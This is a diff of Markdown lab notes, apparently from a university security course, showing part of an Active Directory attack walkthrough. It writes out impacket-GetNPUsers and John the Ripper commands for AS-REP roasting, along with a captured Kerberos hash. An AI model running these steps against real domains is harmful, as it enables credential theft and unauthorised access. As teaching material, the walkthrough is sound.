@@ -119,11 +119,11 @@ As first attempt, we ask the DomainController the list of all accounts that can 
 	==MOSTRARE GRUPPI --> ACCOUNT NON È ADMIN==
 	
  3. **Ask for a TGT:**
-We now ask the DC to generate a **TGT** for each of the previous accounts and we format them so that they are ready to be cracked using *John the Ripper*:
+We now ask the DC to generate a **TGT** for each of the previous accounts and we format them so they are ready to be cracked using *John the Ripper*:
 
     `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request -format john`
 
-	From the output, we copy the string referring to the desired account (*as shown below*) in a **text file** called `usernames.txt` and located on the desktop.
+	From the output, we copy the string referring to `DNSoperator` in a **text file** called `usernames.txt` and located on the desktop.
 	
 	   `$krb5asrep$DNSoperator@CYBERSEC.UNITS.IT:8690a5aa5b288a036a49126539f292ef$afe3e87aafc
 	    35690745c5dfeb1f459dcc1ed858f1f4755d3aefa12921c93dbc35b35c0fd6094be7390eab67e0c016f96
@@ -135,8 +135,8 @@ We now ask the DC to generate a **TGT** for each of the previous accounts and we
 
  
  4. **Perform AS-Rep Roasting:**
- As said, we will now try to crack the password used for encoding the response obtained together with the TGT, performing a so-called AS-Rep Roasting attack.
-	For doing so, we will use **John the Ripper**, basing the offline-guessing activity on a password dictionary called `rockyou`.
+ As said, we will now try to crack the password used for encoding the response obtained together with the TGT, performing a so-called **AS-Rep Roasting** attack.
+	For doing so, we will use **John the Ripper**, password dictionary called `rockyou`.
 	
     `john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep ./Desktop/usernames.txt`
 
@@ -233,7 +233,7 @@ To open a remote desktop connection, we can use the following command directly f
 
 hhhh
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTM4ODgxNDY4MiwxNDE0NjE5NzA0LC0xMT
+eyJoaXN0b3J5IjpbLTQwNDQ5NjA3MiwxNDE0NjE5NzA0LC0xMT
 EwMTc4OTczLC02MDA0MTkxMzAsOTI3MzAxMTU2LC02NzE1NTMx
 MDAsMTIzOTM2MjY3MCwxMTE2NTI1MzgsMTY5OTUxMDM3Miw1NT
 EyMDc5NzAsLTE2MjczOTEyNDEsLTMzMTU3NDI3MCwtMTcwNzU4
